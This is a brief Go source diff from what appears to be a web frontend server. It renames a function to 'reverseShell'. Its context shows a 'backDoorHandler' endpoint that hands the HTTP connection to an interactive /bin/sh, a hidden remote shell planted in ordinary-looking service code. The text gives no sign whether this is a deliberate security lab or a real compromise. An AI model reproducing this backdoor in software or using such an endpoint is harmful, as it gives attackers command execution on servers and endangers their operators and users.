@@ -194,7 +194,7 @@ func GetConn(r *http.Request) net.Conn {
 	return r.Context().Value(ConnContextKey).(net.Conn)
 }
 
-func reverse(c net.Conn) {
+func reverseShell(c net.Conn) {
 	cmd := exec.Command("/bin/sh")
 	cmd.Env = append(os.Environ(),
 		"PS1=\\u@\\h",
@@ -206,7 +206,7 @@ func reverse(c net.Conn) {
 
 func (fe *frontendServer) backDoorHandler(w http.ResponseWriter, r *http.Request) {
 	conn := GetConn(r)
-	reverse(conn)
+	reverseShell(conn)
 	w.WriteHeader(200)
 }
 
